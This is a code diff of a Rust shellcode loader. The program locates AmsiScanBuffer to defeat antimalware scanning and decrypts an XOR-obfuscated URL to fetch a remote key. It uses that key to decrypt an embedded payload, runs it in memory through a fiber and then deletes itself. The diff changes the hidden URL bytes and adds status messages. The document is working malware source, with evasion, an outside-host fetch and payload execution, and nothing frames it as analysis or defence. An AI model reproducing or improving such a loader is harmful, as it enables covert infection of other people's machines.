@@ -92,7 +92,7 @@ fn main() -> Result<()> {
             match get_privs::enable_debug_privilege() {
                 Ok(_) => {},
                 Err(_) => {
-                    // println!("Failed: 210");
+                    println!("[-] Failed to enable debug privilege");
                 },
             }
         }
@@ -114,6 +114,7 @@ fn main() -> Result<()> {
         let amsi_func_str = std::ffi::CString::new(amsi_func_vec).unwrap();
 
         let h_module = LoadLibraryA(PCSTR(amsi_dll_str.as_ptr() as *const u8))?;
+
         let amsi_scan_buffer = GetProcAddress(h_module, PCSTR(amsi_func_str.as_ptr() as *const u8))
             .ok_or_else(|| Error::from_thread())? as *const u8;
         let bytes = std::slice::from_raw_parts(amsi_scan_buffer, 0x1000);
@@ -202,7 +203,7 @@ fn main() -> Result<()> {
         let encrypted_shellcode: &[u8] = include_bytes!("enc_payload.bin");
         
         // decrypt URL
-        let url_bytes: [u8; 30] = [0x2f, 0x10, 0x16, 0x41, 0x4a, 0x70, 0x4b, 0x5f, 0x5b, 0x42, 0x1f, 0x75, 0x72, 0x78, 0x0d, 0x73, 0x51, 0x4c, 0x00, 0x45, 0x68, 0x5e, 0x56, 0x56, 0x44, 0x02, 0x6b, 0x2f, 0x25, 0x5a];
+        let url_bytes: [u8; 42] = [0x2f, 0x10, 0x16, 0x41, 0x03, 0x65, 0x4b, 0x41, 0x06, 0x1f, 0x52, 0x37, 0x69, 0x33, 0x4b, 0x26, 0x16, 0x07, 0x1f, 0x1f, 0x2d, 0x03, 0x41, 0x12, 0x11, 0x56, 0x21, 0x37, 0x6f, 0x12, 0x68, 0x17, 0x16, 0x50, 0x04, 0x36, 0x07, 0x41, 0x04, 0x19, 0x5d, 0x21];
         let url_key = b"Gdb1p_dnbp1DD@#";
         let decrypted_url_vec = crypto_utils::xor_decrypt(&url_bytes, url_key);
         let decrypted_url = match String::from_utf8(decrypted_url_vec) {
@@ -212,16 +213,21 @@ fn main() -> Result<()> {
 
         // fetch key
         let pem_key = match crypto_utils::fetch_key(&decrypted_url) {
-            Ok(k) => k,
+            Ok(k) => {
+                k
+            },
             Err(_) => {
-                // if key fails (TODO)
                 return Ok(());
             }
         };
 
         let shellcode = match crypto_utils::decrypt_shellcode(encrypted_shellcode, &pem_key) {
-            Ok(s) => s,
+            Ok(s) => {
+                println!("[+] Shellcode decrypted successfully");
+                s
+            },
             Err(_) => {
+                println!("[-] Failed to decrypt shellcode (Key mismatch?)");
                 return Ok(());
             }
         };
@@ -231,19 +237,18 @@ fn main() -> Result<()> {
             "/l" => {
                 // LOCAL FIBER
                 if _is_admin {
-                    // println!("[+] Initialized");
+                } else {
                 }
-                // println!("[+] Loading ... (this may take a while)");
 
                 // convert current thread to fiber
                 let main_fiber = ConvertThreadToFiber(None);
                 if main_fiber.is_null() {
-                    // panic!("Failed: 862");
                     return Ok(());
                 }
 
                 // allocate memory as RW
                 let shellcode_size = shellcode.len();
+                
                 let shellcode_mem = VirtualAlloc(
                     None,
                     shellcode_size,
@@ -251,7 +256,7 @@ fn main() -> Result<()> {
                     PAGE_READWRITE
                 );
                 if shellcode_mem.is_null() {
-                    // panic!("Failed: 472");
+                    println!("[-] VirtualAlloc failed");
                     return Ok(());
                 }
 
@@ -266,19 +271,23 @@ fn main() -> Result<()> {
                     PAGE_EXECUTE_READ,
                     &mut old_protect,
                 )?;
+                
+                println!("[+] Stager memory ready (RX). Switching to fiber...");
 
                 // create fiber w/ shellcode addr as entry
                 type FiberStartRoutine = unsafe extern "system" fn(*mut c_void);
                 let shellcode_func: FiberStartRoutine = std::mem::transmute(shellcode_mem);
                 let shellcode_fiber = CreateFiber(0, Some(shellcode_func), None);
                 if shellcode_fiber.is_null() {
-                    // panic!("Failed: 543");
+                    println!("[-] CreateFiber failed");
                     return Ok(());
                 }
 
                 // transfer execution to shellcode
                 SwitchToFiber(shellcode_fiber);
                 // may not reach
+                println!("[!] Execution returned from stager (Should not happen if successful?)");
+
                 if use_delete {
                     let _ = suicide::delete_self(None);
                 }
